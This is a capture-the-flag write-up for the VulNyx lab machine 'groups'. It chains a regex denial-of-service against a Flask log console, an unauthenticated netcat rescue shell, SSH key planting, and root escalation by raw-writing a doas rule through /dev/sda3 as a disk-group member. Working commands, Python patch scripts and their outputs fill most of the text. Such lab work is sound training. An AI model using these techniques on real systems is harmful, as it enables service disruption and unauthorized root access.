# groups

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| groups | noneofyour | Medium | VulNyx |

**Summary:** The target exposes a Werkzeug development server on port 2299 titled logiscope, a log ingest and filtering console whose `POST /config/edit` endpoint stores a fully attacker controlled regular expression that the application later compiles with Python's backtracking `re` engine on every ingested event. Submitting the catastrophic pattern `(a+)+$` and flooding `POST /event` with non matching payloads of twenty eight `a` characters locks the single vCPU in exponential backtracking, the GIL freezes the entire process, and even the regex free `/health` probe stops answering. A per minute cron watchdog notices two consecutive health failures and, as a deliberately fail open maintenance feature, launches an unauthenticated netcat listener on the previously closed port 8090 that execs a plain shell as the user `setup`, whose only supplemental group is `disk`. That group owns the block devices, so the raw partition `/dev/sda3` becomes readable and writable past every file permission. After flushing the page cache with `sync`, a full device scan locates the Alpine default doas rule `permit persist :wheel` in three places, and a same length in place overwrite turns it into `permit nopass setup`, after which `doas -u root` yields an immediate root shell and both flags.

---

## Reconnaissance

The engagement started on the VirtualBox host only network `192.168.56.0/24`, with the attacker at `192.168.56.1`. Host discovery ran first so the target address could be confirmed before any port work.

1. ARP ping sweep located the live machines.

```bash
~/projects/create                                                                                                                                                                                   00:56:29
❯ sudo nmap -sn -PR 192.168.56.0/24
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-12 00:56 +0700
Nmap scan report for 192.168.56.100
Host is up (0.00046s latency).
MAC Address: 08:00:27:C6:26:C2 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.184
Host is up (0.00052s latency).
MAC Address: 08:00:27:D8:43:F6 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 5.53 seconds
```

The target answered as `192.168.56.184`. The second host at `.100` later proved to have no open TCP ports at all, a dead end worth noting so it is not retested.

2. A full TCP scan with default scripts and version detection fingerprinted the attack surface.

```bash
~/projects/create                                                                                                                                                                                6s 00:56:36
❯ ip=192.168.56.184

~/projects/create                                                                                                                                                                                   00:56:43
❯ nmap -p- -sCV -Pn -T4 --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-12 00:56 +0700
Nmap scan report for 192.168.56.184
Host is up (0.00021s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.3 (protocol 2.0)
2299/tcp open  http    Werkzeug httpd 3.1.8 (Python 3.14.7)
|_http-title: logiscope
|_http-server-header: Werkzeug/3.1.8 Python/3.14.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.01 seconds
```

Two services only. Port 22 offered OpenSSH with no credentials to use, so the entire initial access story had to come from port 2299, a Werkzeug development server running Python 3.14.7 under the title logiscope. A development server in production position is itself a smell, and it meant a single Python process behind everything.

The landing page presented a plain internal tool: a table of recently ingested events, a form called Processing Rule that posts to `/config/edit`, and a link to `/events/export`.

port 2299:
![alt text](images/Pasted%20image%2020260912005738.png)

3. Content discovery confirmed the API surface before touching it.

```bash
~/projects/create                                                                                                                                                                                   00:58:36
❯ feroxbuster -u http://$ip:2299/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.184:2299/
 🚩  In-Scope Url          │ 192.168.56.184
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://192.168.56.184:2299/config/edit
200      GET        1l        6w       51c http://192.168.56.184:2299/events/export
200      GET       63l      375w     2867c http://192.168.56.184:2299/
200      GET        1l        2w       16c http://192.168.56.184:2299/health
405      GET        5l       20w      153c http://192.168.56.184:2299/event
200      GET        1l        4w       39c http://192.168.56.184:2299/config
```

Five endpoints, two of them answering 405 to GET which reveals them as POST only write surfaces.

4. Each endpoint was probed individually to map methods and response shapes.

```bash
~/projects/create                                                                                                                                                                                   00:59:48
❯ curl -i http://$ip:2299/config/edit
HTTP/1.1 405 METHOD NOT ALLOWED
Server: Werkzeug/3.1.8 Python/3.14.7
Date: Fri, 11 Sep 2026 17:44:45 GMT
Content-Type: text/html; charset=utf-8
Allow: OPTIONS, POST
Content-Length: 153
Connection: close

<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>

~/projects/create                                                                                                                                                                                   01:00:46
❯ curl -i http://$ip:2299/event      
HTTP/1.1 405 METHOD NOT ALLOWED
Server: Werkzeug/3.1.8 Python/3.14.7
Date: Fri, 11 Sep 2026 17:44:58 GMT
Content-Type: text/html; charset=utf-8
Allow: OPTIONS, POST
Content-Length: 153
Connection: close

<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>

~/projects/create                                                                                                                                                                                   01:00:58
❯ curl -i http://$ip:2299/events/export
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.14.7
Date: Fri, 11 Sep 2026 17:45:04 GMT
Content-Type: application/json
Content-Length: 51
Connection: close

{"total_lines": 0, "match_count": 0, "matches": []}%                                                                                                                                                         
~/projects/create                                                                                                                                                                                   01:01:05
❯ curl -i http://$ip:2299/config                                                                                          
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.14.7
Date: Fri, 11 Sep 2026 17:45:20 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{"version": "1.0", "pattern_set": true}%                                                                                                                                                                     
~/projects/create                                                                                                                                                                                   01:01:20
❯ curl -i http://$ip:2299/health      
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.14.7
Date: Fri, 11 Sep 2026 17:45:25 GMT
Content-Type: application/json
Content-Length: 16
Connection: close

{"status": "ok"}%   
```

`/config` had already been hardened against leaking the live rule, it returns only a version string and a boolean, so no regex hint is handed out for free. `/health` is the liveness probe, which becomes important later because something on the box watches it.

5. The write endpoints were exercised with benign input to learn their grammar.

```bash
~/projects/create                                                                                                                                                                                   01:04:54
❯ curl -s -X POST http://$ip:2299/config/edit --data-urlencode 'test'
{"error": "pattern required"}%                                                                                                                                                                               
~/projects/create                                                                                                                                                                                   01:04:57
❯ curl -s -X POST http://$ip:2299/config/edit --data-urlencode 'pattern=test'
{"status": "updated"}% 

~/projects/create                                                                                                                                                                                   01:05:32
❯ curl -s -X POST http://$ip:2299/event --data-urlencode 'testing123' 
{"matched": true, "line_no": 3}% 
```

The form field is named `pattern`, the value is stored verbatim, and `/event` appends the request body to the working log then reports whether the stored rule matched it. The event immediately appeared in the landing page table, confirming the full loop from write to read.

![alt text](images/Pasted%20image%2020260912010600.png)

The application therefore takes an arbitrary regular expression from the network, compiles it with Python `re`, and runs it against attacker supplied strings, with no length cap on the pattern at ingest time and no timeout on the match. That is the textbook recipe for regular expression denial of service.

---

## Initial Access

### ReDoS: Weaponizing the Configurable Regex

6. The stored rule was replaced with the classic nested quantifier pattern.

```bash
~/projects/create                                                                                                                                                                                   01:01:25
❯ curl -s -X POST http://$ip:2299/config/edit --data-urlencode 'pattern=(a+)+$'
{"status": "updated"}%  
```

`(a+)+$` gives the backtracking engine exponentially many ways to split a run of `a` characters. A string that matches nothing but fails only at the final character forces the engine to enumerate all of them before answering, and on this one vCPU machine a single scan of twenty eight `a` characters followed by a `b` costs roughly forty seconds of pure CPU.

7. Four concurrent payloads were fired at the ingest endpoint and the freeze was measured through the health probe.

```bash
~/projects/create                                                                                                                                                                                   01:07:53
❯ for i in 1 2 3 4; do
  curl -s -m 400 -X POST http://$ip:2299/event \
    --data-binary "$(python3 -c 'print("a"*28+"b")')" &
done
[2] 68498
[3] 68499
[4] 68502
[5] 68504

~/projects/create                                                                                                                                                                                   01:08:23
❯ curl -s -m 8 -o /dev/null -w "%{http_code} (%{time_total}s)\n" http://$ip:2299/health

000 (8.001143s)
```

Flask serves each request on its own thread, but the `re` engine holds the GIL for the entire match, so the four scans serialize and the interpreter is monopolized for minutes. `/health` never touches the regex yet still timed out with status `000`, which is the externally visible proof that the whole process is wedged. Four payloads were used instead of one because a single scan ends before the watchdog finishes counting, and the console must stay open long enough to be caught.

### Watchdog Fail Open: The Emergency Console Appears

8. The port list was rescanned while the service was stalled, and a third port had appeared.

```bash
~/projects/create                                                                                                                                                                                   01:12:55
❯ nmap -p- -Pn --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-12 01:14 +0700
Nmap scan report for 192.168.56.184
Host is up (0.00053s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
2299/tcp open  pc-telecommute
8090/tcp open  opsmessaging

Nmap done: 1 IP address (1 host up) scanned in 3.57 seconds
```

Port 8090 was absent on every earlier scan and showed up roughly two minutes into the stall. A cron job running every minute as the user `setup` polls `http://127.0.0.1:2299/health` with a ten second timeout, keeps a consecutive failure counter in `/home/setup/.wd_state`, and on the second failure launches `nc -lk -p 8090 -e /opt/logservice/rescue.sh`. The maintenance design is fail open by intent: when the service is down, open a door instead of alerting.

9. Connecting to the new listener produced a shell with no authentication.

```bash
~/projects/create                                                                            01:17:02
❯ nc $ip 8090                     
SULOG Monitor emergency maintenance console
Authorized personnel only. Session is logged.
id
uid=1000(setup) gid=1000(setup) groups=6(disk),1000(setup)
hostname 
groups
ls -la
total 16
drwxr-sr-x    2 setup    setup         4096 Sep 11 22:52 .
drwxr-sr-x    3 root     root          4096 Sep 10 11:14 ..
-rw-------    1 setup    setup            0 Sep 11 23:31 .ash_history
-rw-r--r--    1 setup    setup            2 Sep 12 01:01 .wd_state
-rw-r--r--    1 setup    setup           43 Sep 10 17:08 user.txt
```

The banner threatens, but `rescue.sh` ends in a bare `exec /bin/sh`. The identity line is the headline of the whole machine: `setup` holds exactly one supplemental group, `6(disk)`, and the hostname itself is `groups`. The user flag file `user.txt` sits right there in the home directory.

### Shell Stabilization Over SSH

10. The socket shell has no tty, so a key was planted for a real session.

```bash
~/projects/create                                                                      1m 3s 01:20:02
❯ ssh-keygen -q -N '' -f ./id_rsa  

~/projects/create                                                                            01:20:13
❯ cat id_rsa.pub                                                                       
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKXCdq+BgmlzJmQ4VH7qD86wtY4bUqsPNp7nxd2hyDU5 setyanoegraha@archlinux
```

```bash
mkdir .ssh/
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKXCdq+BgmlzJmQ4VH7qD86wtY4bUqsPNp7nxd2hyDU5 setyanoegraha@archlinux' > .ssh/authorized_keys
chmod 700 .ssh 
chmod 600 .ssh/authorized_keys
```

Both blocks run inside the rescue console, writing the attacker public key into `/home/setup/.ssh/authorized_keys`, which the setup user owns and sshd accepts.

```bash
~/projects/create                                                                            01:22:15
❯ ssh -i id_rsa setup@$ip
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

groups:~$ id
uid=1000(setup) gid=1000(setup) groups=6(disk),1000(setup)
```

A fully interactive shell as `setup` with job control and history. From here the rest of the engagement runs over SSH.

---

## Privilege Escalation

### The disk Group: Raw Block Device Equals Root

11. The primitive was confirmed by inspecting the partition table of the running system.

```bash
groups:~$ df -h
Filesystem                Size      Used Available Use% Mounted on
devtmpfs                 10.0M         0     10.0M   0% /dev
shm                     989.2M         0     989.2M   0% /dev/shm
/dev/sda3                15.5G    126.7M     14.6G   1% /
tmpfs                   395.7M    140.0K     395.5M   0% /run
/dev/sda1               271.1M     27.6M     224.5M  11% /boot
tmpfs                   989.2M         0     989.2M   0% /tmp
groups:~$ ls -la /dev/sda*
brw-rw----    1 root     disk        8,   0 Sep 12 00:23 /dev/sda
brw-rw----    1 root     disk        8,   1 Sep 12 00:23 /dev/sda1
brw-rw----    1 root     disk        8,   2 Sep 12 00:23 /dev/sda2
brw-rw----    1 root     disk        8,   3 Sep 12 00:23 /dev/sda3
```

Every block device is `brw-rw---- root:disk`, and membership in `disk` grants read and write to the raw partition. Permission checks happen at the inode layer of the mounted filesystem; bytes addressed through the block device never pass that layer, so any file on `/dev/sda3` can be read or rewritten regardless of its mode. The classic follow up, cracking the root hash from `/etc/shadow` after reading it raw, is unreliable here because the kernel serves cached file pages that a raw write does not invalidate, and the root password was rotated at provisioning anyway. The chosen route writes a different, smaller file instead.

12. The doas configuration was enumerated to find the exact text to search for on disk.

```bash
groups:~$ ls -la /etc/doas.conf 
-rw-r-----    1 root     root           213 Oct 11  2024 /etc/doas.conf
groups:~$ ls -la /etc/doas.d/20-wheel.conf 
-rw-r--r--    1 root     root            22 Sep 10 10:51 /etc/doas.d/20-wheel.conf
groups:~$ cat /etc/doas.d/20-wheel.conf 
permit persist :wheel
```

`doas.conf` itself is `640 root:root`, unreadable to `setup`, and `doas id` returns `Operation not permitted` because `setup` is not in `wheel`. The drop in file `20-wheel.conf` is world readable and shows the exact rule text `permit persist :wheel`, twenty one bytes, which becomes the search pattern. Rewriting that rule into `permit nopass setup` through the block device turns doas into the escalation path, and doas parses its configuration on every invocation, so there is no long lived cache holding the old content the way `su` holds `/etc/shadow`.

13. The filesystem was flushed before scanning so the disk state matches the cache state.

```bash
groups:~$ sync
groups:~$ sync
groups:~$ sync
```

`sync` needs no privileges and takes seconds. It forces every dirty page, including the drop in file written during provisioning, down to the platter, so the scan below sees the same bytes the kernel would read back after eviction.

14. A full device scan located every copy of the rule.

```bash
groups:~$ python3 - <<'PYEOF'
> BLOCK = 1024*1024
> pats = [b"permit persist :wheel"]
> with open("/dev/sda3","rb") as f:
>     for i in range(0, 15600):
>         f.seek(i*BLOCK)
>         d = f.read(BLOCK)
>         for p in pats:
>             j = d.find(p)
>             while j >= 0:
>                 print("blk", i, "off", j)
>                 j = d.find(p, j+1)
> 
> PYEOF
blk 4224 off 73728
blk 4226 off 233213
blk 4226 off 667839
```

The script walks the partition in 1 MB windows (the range 15600 covers the whole 15.5 GB device) and prints, for every occurrence, the window number and the byte offset inside it. The absolute position on disk is `blk * 1048576 + off`. Three occurrences appear: the live `20-wheel.conf`, the live `doas.conf`, and one stale copy left in an older block allocation. Patching all three costs nothing, stale copies are unreferenced free space, and it guarantees the live one is covered regardless of which is which. Note that busybox grep on Alpine has no `-b` or `-a` flags, so the usual `grep -aob /dev/sda3` one liner from GNU tutorials fails here; `strings -t d /dev/sda3 | grep 'permit persist'` is the shell alternative, at roughly eleven minutes for the full device versus three to four for the Python walk.

15. The replacement rule was size checked before writing.

```bash
groups:~$ python3 -c "print(len(b'permit nopass setup  '))"
21
```

The overwrite must be exactly twenty one bytes, the length of `permit persist :wheel`, so no byte anywhere after the rule shifts and the filesystem structures stay untouched. `permit nopass setup` is nineteen characters, padded with two trailing spaces that the doas parser discards.

16. All three copies were patched in place with verification.

```bash
groups:~$ python3 - <<'PYEOF'
> import os
> BLOCK = 1024*1024
> NEW = b"permit nopass setup  " 
> hits = [(4224, 73728), (4226, 233213), (4226, 667839)]
> with open("/dev/sda3","r+b") as f:
>     for blk, off in hits:
>         f.seek(blk*BLOCK + off)
>         cur = f.read(21)
>         assert cur.startswith(b"permit persist :whe"), (blk, off, cur)
>         f.seek(blk*BLOCK + off)
>         f.write(NEW)
>         f.seek(blk*BLOCK + off)
>         rb = f.read(21)
>         assert rb == NEW                                                 
>         print("patched blk", blk, "off", off, rb)
> f.close()
> os.system("sync")                                                        
> print("synced")
> PYEOF
patched blk 4224 off 73728 b'permit nopass setup  '
patched blk 4226 off 233213 b'permit nopass setup  '
patched blk 4226 off 667839 b'permit nopass setup  '
synced
```

Every write is guarded twice: the bytes already at the offset must start with the expected rule (so a wrong offset can never corrupt unrelated data), and the bytes are read back after the write and compared. The final `sync` pushes the changed pages to the disk.

17. The escalation itself is a single command.

```bash
groups:~$ doas -u root sh
/home/setup # cd
~ # cat /etc/doas.d/20-wheel.conf 
permit nopass setup 
~ # id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
root
groups
~ # cat /root/root.txt /home/setup/user.txt 
1471e4e05a4db95d353cc867fe317314
44c5b763d21e9a3ed8cad56977bfd75c
```

`doas -u root sh` now matches the injected rule, asks for no password, and lands a root shell. Reading the drop in file from inside that shell confirms the patched rule is the one doas itself parses. Both flags are captured.

```text
user flag: 1471e4e05a4db95d353cc867fe317314
root flag: 44c5b763d21e9a3ed8cad56977bfd75c
```

---

## Attack Chain Summary

1. **Reconnaissance**: An ARP sweep plus a full port scan exposed OpenSSH 10.3 and a Werkzeug development server on port 2299 titled logiscope, and feroxbuster mapped its five endpoint API including two POST only write surfaces.
2. **Vulnerability Discovery**: The `pattern` field of `POST /config/edit` is stored verbatim and later compiled by Python's backtracking `re` engine against every `POST /event` body, with no complexity limit and no timeout, while the landing page and `/config` deliberately refuse to display the current rule.
3. **Exploitation**: The catastrophic regex `(a+)+$` combined with four concurrent payloads of `a`*28 plus `b` wedged the single vCPU through GIL serialization, the `/health` probe stopped answering, and the per minute cron watchdog counted two failures and opened an unauthenticated `nc -lk -p 8090 -e /opt/logservice/rescue.sh` maintenance console.
4. **Internal Enumeration**: The console dropped into a shell as `setup` whose only supplemental group is `disk`, which owns `/dev/sda3` at `brw-rw----`, and enumeration of `/etc/doas.d/20-wheel.conf` revealed the exact twenty one byte rule `permit persist :wheel` as the patch target.
5. **Privilege Escalation**: After `sync`, a full device scan found the rule in three locations, each was overwritten in place with the same length `permit nopass setup` under content verification and read back checks, and `doas -u root sh` returned a root shell with both flags.
